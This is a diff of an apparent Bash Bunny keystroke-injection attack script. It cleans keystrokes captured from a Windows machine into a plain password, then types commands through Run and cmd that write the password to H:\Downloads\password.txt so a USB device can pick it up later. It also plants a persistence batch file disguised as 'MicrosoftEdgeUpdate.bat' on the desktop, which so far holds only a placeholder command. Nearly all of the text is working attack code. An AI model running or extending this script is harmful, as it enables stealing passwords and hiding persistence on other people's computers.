@@ -102,8 +102,11 @@ log INFO "STEP 4 OK: Capture complete — $(wc -c < /root/loot/win-pass.txt) byt
 # Bash Bunny (plugged in later in STORAGE mode) can read and exfil this file.
 # Uses plain cmd echo — no PowerShell, no execution policy needed.
 
-log INFO "STEP 5: Dropping keylog to Windows %%TEMP%%\.sysinfo for Bash Bunny pickup"
-RAW_KEYS=$(cat /root/loot/win-pass.txt | tr -d '\n\r')
+log INFO "STEP 5: Dropping keylog to H:\\Downloads\\password.txt for Bash Bunny pickup"
+# Strip multi-char tokens like [ENTER],[SHIFT],[BACKSPACE] — leave only typed chars
+# [A-Z_]{2,} matches multi-char token names; single-char tokens like [a] become just 'a'
+CLEAN_KEYS=$(sed 's/\[[A-Z_0-9]\{2,\}\]//g' /root/loot/win-pass.txt | tr -d '[]' | tr -d '\n\r')
+log INFO "STEP 5: Cleaned password to inject: ${CLEAN_KEYS}"
 
 Q DELAY 2000
 Q GUI r
@@ -111,11 +114,15 @@ Q DELAY 600
 Q STRING cmd
 Q ENTER
 Q DELAY 600
-Q STRING echo ${RAW_KEYS}> %TEMP%\.sysinfo
+Q STRING cd H:\Downloads
 Q ENTER
+Q DELAY 200
+Q STRING echo ${CLEAN_KEYS} > password.txt
+Q ENTER
+Q DELAY 200
 Q STRING exit
 Q ENTER
-log INFO "STEP 5 OK: Drop command sent — Bash Bunny reads %%TEMP%%\.sysinfo after plugging in"
+log INFO "STEP 5 OK: password.txt written to H:\\Downloads"
 
 #####################Persistence Batch File on H:\Desktop##################
 # Drops a .bat file directly onto H:\Desktop using plain cmd echo — no quotes,
@@ -132,7 +139,7 @@ Q DELAY 400
 Q STRING cd /d H:\Desktop
 Q ENTER
 Q DELAY 200
-Q STRING echo This could be a POST or SSH command> MicrosoftEdgeUpdate.bat
+Q STRING echo "This could be a POST or SSH command" > MicrosoftEdgeUpdate.bat
 Q ENTER
 Q DELAY 200
 Q STRING exit
